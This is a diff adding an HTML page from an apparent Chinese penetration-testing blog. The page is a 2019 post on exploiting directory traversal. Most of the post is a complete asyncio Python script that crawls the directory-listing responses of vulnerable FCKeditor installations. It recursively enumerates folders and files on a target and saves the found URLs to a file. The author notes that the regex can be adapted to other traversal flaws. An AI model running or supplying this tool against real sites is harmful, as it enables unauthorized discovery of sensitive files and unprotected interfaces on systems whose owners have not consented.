@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="description" content="对存在目录遍历漏洞的网站进行遍历，获取存在的 url"/>
+  <meta name="author" content="Reber"/>
+  
+    
+      <title>目录遍历利用 | Reber&#39;s Blog</title>
+    
+  
+  <link rel="stylesheet" href="/css/reset.css"/>
+  <link rel="stylesheet" href="/css/font.css"/>
+  <link rel="stylesheet" href="/css/smigle.css"/>
+  
+    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
+  
+    <link rel="stylesheet" href="/css/style.css"/>
+  
+  
+    <script src="/js/jquery-3.6.0.min.js"/></script>
+  
+    <script src="/js/highlight.min.js"/></script>
+  
+    <script src="/js/style.js"/></script>
+  
+  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+</head>
+
+  <body>
+    <header>
+  <div id="brand">
+    <a class="icon-link" href="https://wyb0.com/">
+      <img
+        class="icon"
+        src="/img/logo.png"
+      />
+    </a>
+    <div class="text">
+      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
+      <h3>只会一点点编程、只会一点点渗透</h3>
+    </div>
+  </div>
+  <nav>
+    
+      
+        
+        <a href="/"><b>Home</b></a>
+      
+         | 
+        <a href="/posts/"><b>Posts</b></a>
+      
+         | 
+        <a href="/categories/"><b>Categories</b></a>
+      
+         | 
+        <a href="/tags/"><b>Tags</b></a>
+      
+         | 
+        <a href="/about/"><b>About</b></a>
+      
+         | 
+        <a href="/friends/"><b>Friends</b></a>
+      
+    
+  </nav>
+  <hr />
+</header>
+
+    <div id="content">
+      
+  <main>
+    <article>
+      <h1>目录遍历利用</h1>
+      <div class="post-meta">
+  <strong>
+    <span>Posted on</span>
+    <time>2019-12-16</time>
+    <span>in</span>
+    
+      <a href="/categories/Pentest">Pentest</a>
+  </strong>
+  <span> • 859 words</span>
+  <span> • 2 minute read</span>
+  
+  
+    <div>
+      <span>Tags:</span>
+      
+        <a href="/tags/pentest">pentest</a>
+    </div>
+  
+</div>
+
+      <div>
+
+<h3 id="0x00-目录遍历">0x00 目录遍历</h3>
+
+<p>一个同事说有一些目录遍历，想着能不能搞个脚本啥的，以后利用也方便，自己没有写出来，说让我看看</p>
+
+<p>一般来说存在目录遍历的话就是翻文件，看看有没有一些敏感信息、未授权接口之类的，一个个翻的话也确实比较麻烦</p>
+
+<p>而且 eWebEditor、FCKeditor 这种编辑器有些版本也存在目录遍历漏洞，能找的一些未授权访问也是好的</p>
+
+<p>以前写过一个爬网站链接的脚本，感觉可以在那个脚本的基础上改一下，改过后确实大致能用</p>
+
+<h3 id="0x01-脚本">0x01 脚本</h3>
+
+<pre><code>#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+'''
+@Author: reber
+@Mail: reber0ask@qq.com
+@Date: 2019-08-05 15:58:38
+@LastEditTime: 2019-12-16 17:07:09
+'''
+
+import asyncio
+import aiohttp
+from lxml import etree
+from urllib.parse import urljoin
+from urllib.parse import urlparse
+from urllib.parse import urlunsplit
+from pybloom_live import BloomFilter
+
+
+bf = BloomFilter(100000, 0.01)
+
+def is_repeat(ele):
+    if ele in bf:
+        return True #元素不一定在集合中
+    else:
+        bf.add(ele)
+        return False #元素一定不在集合中
+
+class GetAllLink(object):
+    &quot;&quot;&quot;docstring for GetAllLink&quot;&quot;&quot;
+    def __init__(self, target, crawl_deepth, rate):
+        super(GetAllLink, self).__init__()
+        self.target = target if (&quot;://&quot; in target) else &quot;http://{}/&quot;.format(target)
+        self.crawl_deepth = crawl_deepth
+        self.current_url_path = self.target
+
+        self.sem = asyncio.Semaphore(rate) # 限制并发量
+        self.loop = asyncio.get_event_loop()
+
+        self.url_links = {
+            &quot;a&quot;: [self.target],
+            &quot;img&quot;: [],
+            &quot;link&quot;: [],
+            &quot;script&quot;: [],
+            &quot;external&quot;: [],
+        }
+        self.unvisited = []
+        self.unvisited.append(self.target)
+        self.visited = []
+
+    async def async_get_page(self, url):
+        async with self.sem:
+            async with aiohttp.ClientSession() as session:
+                try:
+                    async with session.get(url, timeout=10) as resp:
+                        code = resp.status
+                        url = str(resp.url)
+                        html = await resp.text()
+                        return (code, url, html)
+                except aiohttp.client_exceptions.ClientConnectorError:
+                    return (000, url, &quot;Cannot connect to host&quot;)
+
+    def callback(self, future):
+        status_code, url, html = future.result()
+        print(&quot;get url: ==&gt; &quot;+url)
+        self.visited.append(url)
+        if status_code == 200:
+            self.extract_links(url, html)
+        elif status_code == 404 or status_code == 403:
+            print(status_code, url)
+        else:
+            print(status_code, url, html)
+
+    def extract_links(self, url, html):
+        import re
+        url = url.replace(&quot;%5C&quot;,&quot;/&quot;)
+        dir_m = re.findall(r'&lt;Folder name=&quot;(.*?)&quot; /&gt;', html, re.S|re.M)
+        file_m = re.findall(r'&lt;File name=&quot;(.*?)&quot; size=&quot;.*?&quot; /&gt;', html, re.S|re.M)
+        for dir in dir_m:
+            new_url = url+&quot;/&quot;+dir
+            print(new_url.split(&quot;=&quot;)[-1])
+            self.unvisited.append(new_url)
+        for file in file_m:
+            new_url = url+&quot;/&quot;+file
+            print(new_url.split(&quot;=&quot;)[-1])
+            self.visited.append(new_url)
+
+    # def extract_links(self, url, html):
+    #     &quot;&quot;&quot;
+    #     提取 url
+    #     &quot;&quot;&quot;
+    #     o = urlparse(url)
+    #     self.current_url_path = urlunsplit((o.scheme,o.netloc,o.path,'',''))
+
+    #     selector = etree.HTML(html)
+    #     a_list = selector.xpath(&quot;//a/@href&quot;)
+    #     img_list = selector.xpath(&quot;//img/@src&quot;)
+    #     link_list = selector.xpath(&quot;//link/@href&quot;)
+    #     script_list = selector.xpath(&quot;//script/@src&quot;)
+
+    #     for a in a_list:
+    #         self.parse_link(&quot;a&quot;,a)
+    #     for img in img_list:
+    #         self.parse_link(&quot;img&quot;,img)
+    #     for link in link_list:
+    #         self.parse_link(&quot;link&quot;,link)
+    #     for script in script_list:
+    #         self.parse_link(&quot;script&quot;, script)
+
+    # def parse_link(self, link_type, link):
+    #     url = None
+    #     if link.startswith(&quot;//&quot;):
+    #         link = &quot;http:&quot;+link
+
+    #     if link.startswith(&quot;/&quot;) or link.startswith(&quot;.&quot;): #相对路径，肯定是本域
+    #         url = urljoin(self.current_url_path, link)
+    #     elif link.startswith(self.target): #完整url，且为本域
+    #         url = link
+    #     elif link.startswith('http') or link.startswith('https'): # url为http开头且domain不在url中，肯定为外域
+    #         url = link
+    #         link_type = &quot;external&quot;
+
+    #     if url and (not is_repeat(url)):
+    #         if link_type == &quot;a&quot;:
+    #             print(&quot;match url: &quot;+url)
+    #             self.unvisited.append(url)
+    #             self.url_links[link_type].append(url)
+    #         else:
+    #             print(&quot;match url: &quot;+url)
+    #             self.url_links[link_type].append(url)
+
+    def run(self):
+        current_deepth=0
+        while current_deepth &lt; self.crawl_deepth:
+            print(&quot;*&quot;*130)
+            if len(self.unvisited) == 0:
+                break
+            else:
+                tasks = list()
+                while len(self.unvisited) &gt; 0:
+                    url = self.unvisited.pop()
+                    task = asyncio.ensure_future(self.async_get_page(url))
+                    task.add_done_callback(self.callback)
+                    tasks.append(task)
+                self.loop.run_until_complete(asyncio.wait(tasks))
+            current_deepth += 1
+
+
+if __name__ == &quot;__main__&quot;:
+    import optparse
+    parser = optparse.OptionParser(usage='Usage: %prog [options] domaion',
+                                    version='%prog 1.0')
+    parser.add_option('-u', dest='target',default=None, type='string',help='target domain')
+    parser.add_option('-d', dest='deepth',default=3, type='int',help='crawl deepth')
+    parser.add_option('-r', dest='rate', default=10, type='int', help='the rate, default is 10')
+
+    (options, args) = parser.parse_args()
+
+    if options.target:
+        gal = GetAllLink(target=options.target, crawl_deepth=options.deepth, rate=options.rate)
+        gal.run()
+        # print(&quot;-&quot;*130)
+        # print(&quot;\n&quot;.join(gal.url_links[&quot;a&quot;]))
+        # print(&quot;\n&quot;.join(gal.url_links[&quot;img&quot;]))
+        # print(&quot;\n&quot;.join(gal.url_links[&quot;link&quot;]))
+        # print(&quot;\n&quot;.join(gal.url_links[&quot;script&quot;]))
+        # print(&quot;\n&quot;.join(gal.url_links[&quot;external&quot;]))
+        domain = urlparse(options.target).netloc
+        with open(&quot;{}.txt&quot;.format(domain),&quot;a+&quot;) as f:
+            for url in gal.visited:
+                print(url)
+                f.write(url+&quot;\n&quot;)
+            for url in gal.unvisited:
+                f.write(url+&quot;\n&quot;)
+    else:
+        parser.print_help()
+</code></pre>
+
+<h3 id="0x02-结果">0x02 结果</h3>
+
+<p>其实也就是在原来脚本的基础上注释了 parse_link()，重写了 extract_links()，把结果输出那里改下</p>
+
+<p>这个脚本是基于 FCKeditor 的目录遍历写的，常见的那种目录遍历的话改下 extract_links() 中的正则就行了</p>
+
+<p><img src="/img/post/Xnip2019-12-16_10-20-26.jpg" alt="" /></p>
+</div>
+    </article>
+  </main>
+
+    </div>
+    <footer>
+  <hr />
+  
+    <p id="social">
+      Find me around the web:
+      <br />
+      
+        
+        <a href="https://github.com/reber0?_blank">GitHub</a>
+      
+         | 
+        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
+      
+    </p>
+  
+  <p class="copyright">
+    Copyright © 2015-2022
+    <a href="https://wyb0.com/"><strong>Reber</strong></a>.
+
+    Built with
+    <a href="http://www.gohugo.io/">Hugo</a>,
+    using the theme
+    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
+  </p>
+</footer>
+
+  </body>
+</html>
